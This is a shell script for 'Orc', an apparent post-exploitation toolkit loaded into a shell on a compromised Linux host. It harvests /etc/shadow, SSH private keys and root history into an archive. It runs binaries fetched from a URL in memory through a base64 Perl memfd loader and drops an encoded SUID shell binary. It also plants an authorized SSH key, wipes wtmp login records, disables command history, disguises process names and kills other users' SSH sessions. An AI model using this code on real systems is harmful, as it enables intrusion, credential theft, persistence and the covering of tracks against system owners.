#!/bin/sh
# o.rc
OVERSION="0.5"
# NOTES
#authors: March, Darren Martyn, Ulrich Berntien

# ~~~ Compatibility Layer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# In the compatiblity layer the functions to handle the differences
# between different Unix flavors, shell types are collected.
# Functions outside the compatibility layer call functions in this
# layer or call tools/programs common for all Unix flavors.
#

orc_existsProg () {
  # Checks if a program/command exists.
  # Argument: Program/command name to check.
  # Exit status: 0 if one ore more programs do not exists.
  if [ $# -lt 1 ]; then
    echo 'Error: missing program name to check.'
    return 1;
  fi
  hash "$@" > /dev/null 2> /dev/null
  }

orc_loadURL () {
  # Loads from an URL via curl, wget or perl.
  # Argument: The URL to download, https is supported.
  # Output to stdout: The content of the URL document.
  # Global: http(s)_proxy variables will be used.
  if [ $# -ne 1 ]; then
    echo 'Error: argument must be one URL to load'
    return 1
  fi
  # A proxy could be set via environment variables to the tools.
  # But some tools in some versions needs lower case and some
  # needs upper case variable names. To increase portability
  # both cases will be exported.
  export http_proxy
  export HTTP_PROXY
  if [ -n "$http_proxy" ]; then
    if [ -n "$HTTP_PROXY" ] && [ "$HTTP_PROXY" != "$http_proxy" ]; then
      echo 'Warning, ignore HTTP_PROXY value and use http_proxy value.'
    fi
    HTTP_PROXY=$http_proxy
  elif [ -n "$HTTP_PROXY" ]; then
    http_proxy=$HTTP_PROXY
  fi
  export https_proxy
  export HTTPS_PROXY
  if [ -n "$https_proxy" ]; then
    if [ -n "$HTTPS_PROXY" ] && [ "$HTTPS_PROXY" != "$https_proxy" ]; then
      echo 'Warning, ignore HTTPS_PROXY value and use https_proxy value.'
    fi
    HTTPS_PROXY=$https_proxy
  elif [ -n "$HTTPS_PROXY" ]; then
    https_proxy=$HTTPS_PROXY
  fi
  if orc_existsProg curl; then
    curl --silent --location --insecure -- "$1"
  elif orc_existsProg wget; then
    wget --quiet --no-check-certificate --output-document=- -- "$1"
  elif orc_existsProg perl; then
    perl -e 'use LWP::Simple qw ($ua head get);
             $url = $ARGV[0];
             $ua->ssl_opts(verify_hostname => 0,SSL_verify_mode => 0x00);
             print get $url;
            ' -- "$1"
  elif orc_existsProg python; then
    # Do not insert the code because python is insert sensitive.
    PYTHONHTTPSVERIFY=0 python -c '
import sys, urllib2
request = urllib2.urlopen(sys.argv[1])
sys.stdout.write(request.read())
    ' "$1"
  else
    echo 'Error: no download tool found'
    return 1
  fi
}

orc_tryTcpConnection () {
  # Try to open a TCP connection to given host and port.
  # Argument: host name or host IP address
  #           TCP port number
  # Return: 0 if and ony if TCP connection could be opened
  if [ $# -ne 2 ]; then
    echo 'Error: need host and TCP port as arguments'
    return 1
  fi
  if orc_existsProg bash; then
    # Open a connection with the bash.
    # This is a bash extension. POSIX shell will not support this.
    bash -c "echo '' > /dev/tcp/$1/$2" 2>/dev/null
  elif orc_existsProg nmap; then
    # TCP connect scan with nmap
    nmap -oG - -Pn -sT -p "$2" "$1" | grep -q "/open/tcp/"
  elif orc_existsProg perl; then
    perl -e 'use IO::Socket;
             $s = IO::Socket::INET->new(
                  PeerAddr => $ARGV[0], PeerPort => $ARGV[1],
                  Proto => "tcp", Type => SOCK_STREAM)
                  or exit 1;
             close $s;
            ' -- "$1" "$2"
  elif orc_existsProg python; then
    # TCP connection open with python version 2
    # Do not insert the code because python is insert sensitive.
python -c '
import socket,sys
try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((sys.argv[1],int(sys.argv[2])))
except:
  sys.exit(1)
sys.exit(0)
    ' "$1" "$2"
  elif orc_existsProg nc; then
    # Open connection with netcat
    # Do not use option -N here because not all nc implementations support
    # this (e.g. busybox).
    echo '' | nc -w1 "$1" "$2" 2>/dev/null
  elif orc_existsProg bash; then
    # Open a connection with the bash.
    # This is a bash extension. POSIX shell will not support this.
    bash -c "echo '' > /dev/tcp/$1/$2" 2>/dev/null
  else
    echo 'Error: no tool to open TCP connection found'
    return 1
  fi
}


# ~~~ Helper Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# In the section of the internal helper functions are collected.
# The helper functions are typical not called by the user of o.rc
# Some user level functions uses the functions and variables defined
# in the helper functions section.
#

memfda=$(cat << EOF
IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
EOF
)

memfdb=$(cat << EOF
cHJpbnQgImRvbmVcbiI7CmV4ZWN7Ii9wcm9jLyQkL2ZkLyRmZCJ9ICJ0ZXN0IiwgIiIsICIiIG9yIGRpZTsK
EOF
)

alias 'echo'='/bin/echo'
trap "rm -rf /dev/shm/.q" EXIT TERM INT

# Creates a copy of this scipt in variable backup
# Should be start like "ENV=o.rc sh -i".
backup=""
if [ -r "$BASH_SOURCE" ] && [ ! -r "$ENV" ]; then
  # Script was started in bash via source.
  ENV=$BASH_SOURCE
fi
if [ -r "$ENV" ]; then
  backup=$(cat "$ENV")
  # Convert to absolute file name for later use.
  ENV=$(realpath "$ENV")
fi
NHOME=""

orc_createEchoFile () {
  # Creates a shell script file which echos the arguments.
  # Argument: Text to echo.
  # Global: set $ORC_ECHO_FILE to the created file.
  if [ $# -lt 1 ]; then
    echo 'Error: missing text to echo.'
    return 1
  fi
  if [ "$HOME" = "" ]; then
    echo 'Error, HOME variable is empty'
    return 1
  fi
  # Create the script file in the prepared HOME directory
  ORC_ECHO_FILE="$HOME/.c"
  echo '#!/bin/sh' > "$ORC_ECHO_FILE"
  if [ ! -r "$ORC_ECHO_FILE" ]; then
    echo 'Error, can not create echo file'
    return 1
  fi
  # Limit access to the owner
  chmod a-rw,u=rwx "$ORC_ECHO_FILE"
  # The text must be single-quoted to prevent changes by the shell
  echo "echo '$*'" >> "$ORC_ECHO_FILE"
}

orc_httpsProxyReminder() {
  # Remind the user if https_proxy is not set and
  # tcp connection error to the server at port 443.
  # Argument: Name or IP address of the server.
  # Output to stdout: Reminder.
  # Global: https_proxy variable is checked.
  if [ $# -ne 1 ]; then
    echo 'Error: missing host name'
    return 1
  fi
  if [ -z "$https_proxy" ] && [ -z "$HTTPS_PROXY" ]; then
    # no proxy is defined.
    if ! orc_tryTcpConnection "$1" 443; then
      # no connection and no proxy: remind
      echo 'Info: connection problem, https_proxy could be needed'
      return 2
    fi
  fi
  # else: if https_proxy is defined, then never remind
  return 0
}

# ~~~ User Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# The user functions are designed to be called by the o.rc users.
#

getdbus() {
echo "Dbus services for system:"
dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
echo "Dbus services for session:"
dbus-send --session --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
echo "See https://github.com/taviso/dbusmap for additional dbus auditing!"
}

getsec() {
echo "Let's see if there are any defences."
selinuxenabled >/dev/null 2>/dev/null
	if echo $? | grep -q 0;
	then echo "SELinux is enabled."
	fi
type aa-status >/dev/null 2>/dev/null
	if echo $? | grep -q 0;
	then echo "AppArmor is probably installed."
	fi
	if cat /proc/self/status | grep -q PaX; then
	echo "GrSec and PaX live here."
	fi
}

log2outp() {
  # Runs a command and writes output to files in $OUTP.
  # arguments: basename command command-arguments
  # outputs: pipes stdout into $OUTP/basename.txt
  #          pipes stderr into $OUTP/basename.err
  #          logs basename and command call in $OUTP/log.txt
  if [ ! -d "$OUTP" ]; then
    echo 'output directory not defined or prepared'
    return 1
  fi
  if [ $# -lt 1 ]; then
    echo 'missing basename of the output files'
    return 1
  fi
  echo "$@" >> "$OUTP/log.txt"
  basename=$1
  shift
  if [ $# -lt 1 ]; then
    echo 'missing command to execute'
    return 1
  fi
  "$@" >> "$OUTP/$basename.txt" 2>> "$OUTP/$basename.err"
}

getinfo() {
  echo "Gathering useful command output."
  echo "Find it in $HOME/f.tar.xz"
  OUTP=$HOME/files/
  mkdir --mode 700 "$OUTP"
  log2outp passwd getent passwd
  log2outp uname uname -a
  log2outp ps ps -weFH
  log2outp w w
  log2outp last last -i
  log2outp uptime uptime
  log2outp id id
  log2outp date date
  log2outp cpuinfo cat /proc/cpuinfo
  log2outp free free -g
  log2outp route route -n
  log2outp hosts cat /etc/hosts
  log2outp resolve cat /etc/resolv.conf
  log2outp rpcinfo rpcinfo
  log2outp lsmod lsmod
  log2outp lsusb lsusb
  log2outp mount mount
  log2outp df df
  log2outp user_crontab crontab -l
  if hash ifconfig 2>/dev/null; then
    log2outp ifconfig ifconfig -a
  else
    log2outp ifconfig ip link
  fi
  log2outp netstat netstat -peanut
  if [ "$EUID" = "0" ] || [ -O "/root" ]; then
    # Variable EUID is defined in the bash.
    # Check EUID of /root works in dash (and in bash).
    log2outp shadow getent shadow
    log2outp ssh_keys find /home/ -name id_rsa
    log2outp sudoers cat /etc/sudoers
    log2outp crontab cat /etc/crontab
    log2outp iptables iptables -L
    log2outp secure cat /var/log/secure
    log2outp roothist cat /root/.bash_history
    log2outp sshd_config cat /etc/ssh/sshd_config
    log2outp root_dir ls -al /root/
    #inelegant hack
    log2outp netstat netstat -peanut
    if hash getsebool 2>/dev/null; then
      log2outp sellinux getenforce
      log2outp sellinux getsebool -a
      log2outp sellinux sestatus
    fi
  fi
  # Stores all log files in one compressed tar archive.
  tar -cJf "$HOME/f.tar.xz" "$OUTP"
  if [ $? -gt 0 ]; then
    # maybe the tar internal xz fail. Try an external xz compression.
    tar -cf - "$OUTP" | xz -c -9 > "$HOME/f.tar.xz"
  fi
  if [ $? -gt 0 ]; then
    # maybe xz command failed. Try the old gzip inside tar
    tar -czf "$HOME/f.tar.gz" "$OUTP"
  fi
  # Remove the single log files. Keep only the archive file.
  rm -rf "$OUTP"
}

timedshell() { 
echo "scheduling a reverse shell to launch later..."
}

listusers() {
  # Listing users in passwd with login shells.
  # Reject shells named *nologin or *false as valid shells.
  getent passwd |
  awk -F ':' '
     NF==1 && $1 !~ /^#|nologin$|false$/ {shells[$1]=1}
     $7 in shells {print $1}' /etc/shells -
}

getusers() {
  echo "Listing valid users with shells."
  listusers
}

getuservices() {
  echo "Listing all running services with non-user accounts in passwd."
  { listusers; ps --no-header -weFH; } |
  awk 'NF==1 {users[$1]=1}
       NF>1 && !($1 in users) {print}'
}

getspec() {
echo -ne "RAM available: "
free -hm | tr '\n' ' ' | awk '{ print $8 }'
echo -ne "CPU model:"
grep --color=never name /proc/cpuinfo | head -n 1 | awk -F ":" '{print $2}'
echo -ne "Number of cores: "
grep --color=never -c processor /proc/cpuinfo
echo -ne "Disk usage:"
df -h
}

ourpts() {
  # Get our PTS.
  # Writes nothing if not connected to a PTS.
  mytty=$(tty)
  mypts=${mytty#/dev/pts/}
  # Check if it is a pts device
  if [ "/dev/pts/$mypts" = "$mytty" ]; then
    echo "$mypts"
  fi
}

getidle() {
  # List all ptys and their idle times accurately.
  # Arguments : none
  # Globals   : our_pty could contain the number of our PTY
  export our_pty=$(ourpts)
  stat "/dev/pts/*" -c '%n %X %U' |
  awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
      gsub( /[^0-9]/, "", $1 )
      list[$1]="PTY " $1 " is " now-$2 " seconds idle and owned by " $3
      if( $1==ENVIRON["our_pty"] ) list[$1]=list[$1] " ** this is us **"}
      END {for(i in list) print list[i]}'
  # reminder: do not use gawk functions, e.g. systime
}

srm() {
shred -vzfun 2 "$1"
}

qssh() {
  # ssh without a tty - qssh [password] [normal arguments]
  # Arguments: password
  #            arguments feed through to the ssh
  # Method: Creates a shell script file which echoes the password.
  if [ $# -lt 2 ]; then
    echo 'Error, qssh needs at least password and command as arguments'
    return 1
  fi
  if tty | grep -q "not"; then
    orc_createEchoFile "$1"
    shift
    DISPLAY="" SSH_ASKPASS="$ORC_ECHO_FILE" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
  else
    echo "You've got a tty. You can't use qssh."
  fi
}

qsu() {
  # sudo without a tty - qsu [password] [normal arguments]
  # Arguments: password
  #            arguments feed through to the sudo
  # Method: Creates a shell script file which echoes the password.
  if [ $# -lt 2 ]; then
    echo 'Error, qsu needs at least password and command as arguments'
    return 1
  fi
  orc_createEchoFile "$1"
  shift
  SUDO_ASKPASS="$ORC_ECHO_FILE" sudo -A "$@"
  rm "$ORC_ECHO_FILE"
}

memexec() {
memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
finalmem=$(echo "$memfda" | base64 -d)
finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
echo "$finalmem" | perl
}

getpty() {
SHELL=$(command -v sh)
#echo "$backup" > "$ENV"
if [ -r "$ENV" ]; then
  ENV="$ENV" script -c sh /dev/null
else
  echo "ENV not defined. Can not start script."
fi
}

getsuspect() {
  # Pulls my suspect tool from github.
  # ask and ye shall receive
  # this janky, awful shortcut
  if ! orc_existsProg bash; then
    echo 'Error: bash needed but not found.'
    return 1
  fi
  orc_httpsProxyReminder raw.githubusercontent.com
  orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh' | bash
}

keyinstall() {
touch /dev/shm/.q/.ssh
touch -r /
sshkey="ssh-rsa [YOUR KEY HERE] $(whoami)@$(hostname)"
echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
}

psgrep() {
ps -weFH | grep "$1" | grep -v grep
}

getescape() {
ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
if ls -di --color=never "/proc/$i/root/" | grep -qe "^2\ "; then
	echo "process $i seems to be outside the jail..."
	fi
done

}

getjail() {
ttt=0
echo "Checking to see if we're in one giant simulation..."
	if ls -di --color=never / | grep -vqe "^2.*/$"; then
	TTT=1
	echo "We're in a chroot."
	fi
	if cat /proc/cpuinfo | grep -qi "hypervisor"; then
	echo "Virtual machine!"
	TTT=1
	fi
	if dmesg | grep -qi "hypervisor"; then
	echo "Virtual machine!"
	TTT=1
	fi
	if dmesg | grep -qi "vboxvideo"; then
        echo "Virtual machine! (Virtualbox)"
        TTT=1
        fi
	if echo $TTT | grep -vq "1"; then
	echo "Bare metal!"
	fi
}

portscan() {
  # Run a portscan against common ports
  # List ports which allow TCP connections.
  # Argument: Name or IP of the target box.
  if [ $# -ne 1 ]; then
    echo 'Error, portscan needs one host name or host address'
    return 1
  fi
  echo "Starting portscan of $1 ..."
  for port in  21 22 23 80 443 8080 8443 129 445 3389 3306
  do
    if orc_tryTcpConnection "$1" "$port"; then
      echo "Host $1 TCP port $port open"
    fi
  done
}

fpssh() {
ssh-keyscan "$1"
}

getip() {
#we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
echo "Attempting to get IP..."
echo -ne "HTTP says: "
	orc_loadURL 'https://whatismyip.akamai.com'
echo ""
echo -ne "DNS says: "
	if hash dig>/dev/null; then
	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
	echo -ne "(used dig)\n"
	else
	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
	echo -ne "(used host)\n"
	fi
}

prochide() {
  # Execute a program hiden by a long program name.
  # arguments: program to execute with optional arguments.
  # methode  : use the longest command line of the current running
  #            processes as name of the program to start.
  ARGS="$@"
  LONGARG=$(ps --no-header -wweo cmd | awk 'length(X)<length {X=$0}; END {print X}')
  bash -c "exec -a \"$LONGARG\" $ARGS"
}

getnet() (
#i'm sorry

sorry(){
#this needs work
	if hash ipcalc 2>/dev/null; then
	echo "Pinging IPs in the background..."
		if hash ifconfig 2>/dev/null; then
		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
		echo "$valid" | tr ' ' '\n' | while read i;do
			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
			 echo "$i is alive" >> /dev/shm/.q/ips
			fi
		done
	else 
	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
	echo "$valid" | tr ' ' '\n' | while read i;do
		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
		 echo "$i is alive" >> /dev/shm/.q/ips
		fi
	done
	fi
	else echo "No ipcalc. Checking if we've got a /24 and then pinging the first one..."
		if hash ifconfig 2>/dev/null; then
		if ifconfig | grep -q "255.255.255.0"; then 
		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
		echo "$INPUT" | tr ' ' '\n' | while read i;do
			if ping -c1 -q "$i" | grep -q "\ 0%"; then
			echo "$i" is alive >> /dev/shm/.q/ips
			fi
		done
		else 
			if ip addr show | grep -E '/24*.brd'; then
			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
			echo "$INPUT" | tr ' ' '\n' | while read i;do
				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
				 echo "$i is alive" >> /dev/shm/.q/ips
				fi
			done
			fi
		fi
	fi
fi
}

valida=""
valid=""

echo "Let's see what we can find on the network..."
echo "ARP table:"
	if hash arp 2>/dev/null; then
	arp -na | grep ether |awk -v FS="(\\\(|\\\))" '{print $2}'
	else
	ip neigh show | awk -F " " '{print $1}'
	fi
echo "Pinging broadcast."
echo "Please wait..."
	if hash ifconfig 2>/dev/null; then
	ping -c3 -i 10 -b $(ipcalc -b $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | tr -d "\n")
	else ping -c3 -i 10 -b $(ip addr show | grep inet | grep brd | awk -F ' ' '{print $4}')
	fi
echo "Broadcast ping is done."
echo "Pulling known hosts for your user and writing to /dev/shm/.q/kh..."
cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > /dev/shm/.q/kh
sorry &


)

wiper() {
cat /var/log/wtmp | utmpdump | grep -v "$1" > /dev/shm/.q/.l
touch -r /var/log/wtmp /dev/shm/.q/.l
cat /dev/shm/.q/.l | utmpdump -r -o /var/log/wtmp
touch -r /dev/shm/.q/.l /var/log/wtmp
}

getrel() {
  # Prints the OS name from the release file.
  # arguments: none
  # output   : print to stdout
  # method   : Cuts the name from lines like PRETTY_NAME="name".
  awk -F= 'toupper($1)~/PRETTY/ {gsub(/\"/,"",$2); print $2}' /etc/*release
}

hangup() {
  # Terminate someones PTS by killing their SSH process.
  # arguments: Number(s) of PTS. A single number or a list if numbers
  #            splitted in the arguments is possible.
  #            Or "all" to terminate all PTS connected via SSH.
  #            Or "all other" to terminate all but not our SSH.
  if [ $# -lt 1 ]; then
    echo 'Error: hangup functions needs argument: ID number of PTS'
    return 1
  fi
  if [ "$2" = "other" ]; then
    NOT_THIS=$(ourpts)
  else
    NOT_THIS=""
  fi
  if [ "$1" = "all" ]; then
    PTS_LIST=$(ps -eo args | awk -v exclude="$NOT_THIS" '
       tolower($0) ~ /sshd.*pts\/[0-9]+/ {
       pts=substr($0,index(tolower($0),"pts/")+4);
       if(pts != exclude) print pts }')
  else
    PTS_LIST="$*"
  fi
  echo 'This is seriously rude...'
  for PTS_ID in $PTS_LIST; do
    PTS_NAME="pts/$PTS_ID"
    echo "Terminating $PTS_NAME"
    OWNER=$(stat -c '%U' "/dev/$PTS_NAME")
    if [ "$OWNER" = "" ]; then
      echo "Something is wrong: can't get the owner of $PTS_NAME"
      continue
    fi
    echo "Owner of $PTS_NAME is $OWNER"
    SSHD_PID=$(pgrep -a sshd | grep "$PTS_NAME" | cut -d ' ' -f 1)
    if [ "$SSHD_PID" = "" ]; then
      echo "Something is wrong: can't find SSHD PID of $PTS_NAME"
      continue
    fi
    echo "SSHD PID is $SSHD_PID"
    echo 'Segmentation Fault.' > "/dev/$PTS_NAME"
    sleep 2
    kill -9 "$SSHD_PID"
  done
}

getexploit () {
  # Download and run linux-exploit-suggester.
  # need a better way to do this, honestly
  # i'd like to pass the -g argument to the script
  if ! orc_existsProg bash; then
    echo 'Error: bash needed but not found.'
    return 1
  fi
  orc_httpsProxyReminder raw.githubusercontent.com
  orc_loadURL 'https://raw.githubusercontent.com/bcoles/linux-exploit-suggester/master/linux-exploit-suggester.sh' | bash
}

getenum() {
echo "Doing some basic listing of the usual suspects..."
echo -ne "Kernel: "
uname -rv
echo -ne "glibc: "
$(ldd $(command -v id) | grep --color=never libc.so | awk -F " " '{print $3}') | grep --color=never -i version | grep -v crypt
echo -ne "dbus: "
dbus-daemon --version | grep --color=never Daemon
echo -ne "Init system is: "
ps -p 1 | grep --color=never -v CMD| awk -F " " '{ print $4 }'

}

gethelp() {
echo "A probably non-comprehensive list of functionality in Orc v$OVERSION."
echo "[*] getenum - get kernel, glibc, and dbus versions"
echo "[*] getinfo - create a tar.xz of useful command output"
echo "[*] getrel - attempt to get the OS release file."
echo "[*] getip - get external IP from akamai and google (HTTP and DNS)"
echo "[*] getjail - check if we're in a chroot/VM"
echo "[*] getsec - check if the big three security MAC programs are around"
echo "[*] getusers - pull all users with a shell"
echo "[*] getpty - pop a pty with script"
echo "[*] getidle - list all ptys and their idle times accurately."
echo "[*] getnet - attempt to enumerate hosts on the local network with ping"
echo "[*] getsuspect - pull my suspect tool from github."
echo "[*] getspec - grab some hardware information."
echo "[*] getuservices - list all running services with non-user accounts in passwd"
echo "[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem."
echo "[*] getdbus - list all dbus services."
echo "[*] getexploit - download and run linux-exploit-suggester"
echo "[*] memexec - execute a binary in-memory from a webserver - memexec [full URI] (x64 only)"
echo "[*] portscan - run a portscan against common ports - portscan [host]"
echo "[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]"
echo "[*] srm - alias for secure shredding of files."
echo "[*] qsu - sudo without a tty - qsu [password] [normal arguments]"
echo "[*] qssh - ssh without a tty - qssh [password] [normal arguments]"
echo "[*] wiper - remove entries from wtmp - wiper [string to grep out]"
echo "[*] fpssh - pull ssh remote host fingerprints - fpssh [host]"
echo "[*] stomp - alias for touch -r (needs arguments)"
echo "[*] tools - check for common tools"
echo "[*] dropsuid - drop tiny suid shell - dropsuid > [file]"
echo "[*] hangup - terminate someones PTS by killing their SSH process. Very loud, DO NOT USE. - hangup [PTS NUMBER]"
}

mkdir /dev/shm/.q
cd /dev/shm/.q

alias 'stomp'='touch -r'
alias 'tools'='type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump'
alias 'dropsuid'='echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=" | base64 -d'
alias 'psfull'='ps -weFH'
alias 'listener'='netstat -peanuto'
alias 'netgrep'='netstat -peanuto | grep'
alias 'getp'='getent passwd'

alias 'psql'='PSQL_HISTORY=/dev/null psql'
alias 'ssh'='ssh -T -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
alias 'less'='LESSHISTFILE=/dev/null less'
alias 'wget'='wget --no-hsts'
alias 'vim'='vim -ni NONE'
alias 'mysql'='MYSQL_HISTFILE=/dev/null mysql'


unset HISTFILE
HISTSIZE=0
umask 002
ulimit -c 0

echo "=========== Info ==========="
echo "Short kernel info: "
uname -rni
echo "IP address on the network: "
	if hash ifconfig 2>/dev/null; then
	ifconfig | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
	else
	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
	fi
echo -ne "We are uid " 
id -uz;echo -ne " - "; echo -ne "(";whoami | tr -d '\n';echo ")"
echo -ne "Machine has been "
uptime -p
	if [ -f /etc/machine-id ]; then
	echo -ne "Unique Machine ID: "
	cat /etc/machine-id
	fi
echo "============================"
echo "=== Welcome to Orc Shell ==="
echo "Run gethelp to see a list of commands."
echo "/dev/shm/.q should be deleted upon exit."
PS1='$USER'"@$(hostname):"'$PWD'"$ " 
HOME="/dev/shm/.q"
NHOME=$(getent passwd | grep --color=never "$(id -u)" | cut -d: -f 6)
#rm $ENV
